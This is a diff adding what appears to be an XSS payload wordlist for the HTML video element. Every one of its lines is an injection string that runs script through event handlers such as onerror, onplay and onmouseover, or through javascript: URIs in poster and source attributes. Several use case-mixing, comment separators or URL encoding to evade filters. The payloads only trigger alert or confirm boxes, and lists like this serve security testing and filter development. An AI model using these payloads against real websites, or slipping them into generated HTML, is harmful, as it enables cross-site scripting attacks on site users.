@@ -1,0 +1,72 @@
+<video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onseeked=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onseeking=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onvolumechange=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onwaiting=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video autoplay onloadedmetadata=alert(1)> <source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay onplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay onplaying=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video controls autoplay onended=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video controls autoplay ontimeupdate=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video draggable="true" ondrag="alert(1)">test</video>
+<video draggable="true" ondragend="alert(1)">test</video>
+<video draggable="true" ondragenter="alert(1)">test</video>
+<video draggable="true" ondragleave="alert(1)">test</video>
+<video draggable="true" ondragstart="alert(1)">test</video>
+<video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video id=x tabindex=1 onactivate=alert(1)></video>
+<video id=x tabindex=1 onbeforeactivate=alert(1)></video>
+<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>
+<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>
+<video onbeforecopy="alert(1)" contenteditable>test</video>
+<video onbeforecut="alert(1)" contenteditable>test</video>
+<video onbeforepaste="alert(1)" contenteditable>test</video>
+<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>
+<video oncanplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video onclick="alert(1)">test</video>
+<video oncontextmenu="alert(1)">test</video>
+<video oncopy="alert(1)" contenteditable>test</video>
+<video oncut="alert(1)" contenteditable>test</video>
+<video ondblclick="alert(1)">test</video>
+<video onerror=alert(1337) </poster>
+<VideO/**/OnerroR=~alert("1")+/SrC>
+<video onerror="javascript:javascript:alert(1483)"><source>
+<video onerror="javascript:javascript:alert(1)"><source>
+<video onerror="javascript:javascript:alert(569)"><source>
+<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
+<video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>
+<video onkeydown="alert(1)" contenteditable>test</video>
+<video onkeypress="alert(1)" contenteditable>test</video>
+<video onkeyup="alert(1)" contenteditable>test</video>
+<video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video onloadstart=alert(149)><source>
+<video onloadstart=alert(1)><source>
+<VidEo/oNLoaDStaRt=confirm(1)+/src>
+<video onmousedown="alert(1)">test</video>
+<video onmouseenter="alert(1)">test</video>
+<video onmouseleave="alert(1)">test</video>
+<video onmousemove="alert(1)">test</video>
+<video onmouseout="alert(1)">test</video>
+<video onmouseover="alert(1)">test</video>
+<video onmouseup="alert(1)">test</video>
+<video onpaste="alert(1)" contenteditable>test</video>
+<video poster=javascript:javascript:alert(1)//
+<video poster=javascript:javascript:alert(1479)//
+<video poster=javascript:javascript:alert(565)//
+<video/poster/onerror=alert()>
+<video/poster/onerror=prompt(1)>
+<video><source onerror=alert(1) src=1></video>
+<Video> <source onerror = "javascript: alert (XSS)">
+<video><source onerror="javascript:javascript:alert(1)">
+<video><source onerror="javascript:javascript:alert(1482)">
+<video><source onerror="javascript:javascript:alert(568)">
+<video src=1188 href=1188 onerror="javascript:alert(1188)"></video>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<video src=1 onerror=alert(1)>
+<video src=289 href=289 onerror="javascript:alert(289)"></video>
+<video src=990 onerror=alert(990)>
+<video src/onerror=alert(1)>
+<video/src=//w3schools.com/tags/movie.mp4%0Aautoplay/onplay=(confirm(1))>
+<video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
